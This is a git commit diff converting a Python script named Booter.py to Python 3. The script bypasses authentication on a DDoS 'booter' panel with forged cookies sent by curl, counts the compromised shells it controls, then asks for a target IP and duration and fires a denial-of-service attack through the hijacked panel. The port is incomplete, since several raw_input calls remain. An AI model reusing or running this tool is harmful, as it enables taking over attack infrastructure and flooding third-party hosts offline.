1a788bb843c24d81e439e13be1be8a3d5d2199c0
Yoshi- <b.arne@gmx.de>
2012-01-20 22:51:55 +0100

    updated to python 3

--- Booter.py
+++ Booter.py
@@ -1,11 +1,11 @@
 import re;
 import subprocess
 
-url = raw_input('Url to Booter: ');
+url = input('Url to Booter: ');
 
 url = url + "/" + "hub.php";
 
-print "Checking if booter is vulnerable";
+print ("Checking if booter is vulnerable");
 
 proc =  subprocess.check_output('curl.exe -b "user_id=asd;user_key=asd" ' + url + '');
 result = proc;
@@ -14,22 +14,22 @@ try:
     m = re.search("Shells Statistics", result);
     test = m.group(0);
     boot = 'y';
-    print "Booter is vunerable.";
+    print ("Booter is vunerable.");
     
 except AttributeError:
-    print "Booter is invunerable."
-    boot = raw_input("Do you still want to boot? y/n ")
+    print ("Booter is invunerable.")
+    boot = input("Do you still want to boot? y/n ")
 	
 try:
     m = re.search('(There are currently)?(shells online)?.[^<]?<span .*?>([0-9]+)</span>', result);
     shells = m.group(3);
-    print "Found " + shells + " Shells";
+    print ("Found " + shells + " Shells");
     
 except AttributeError:
-    print "Cannot find amount of shells."
+    print ("Cannot find amount of shells.")
 
 if boot == 'y' :
-    print '';
+    print ('');
     
     time = raw_input('Time: ');
     host = raw_input('IP: ');
@@ -41,9 +41,9 @@ if boot == 'y' :
 
     try:
         m = re.search('(Attack has been sent)', result);
-        print m.group(0);
+        print (m.group(0));
     except AttributeError:
-        print 'Attack maybe failed';
+        print ('Attack maybe failed');
 
-raw_input();
+input();
     
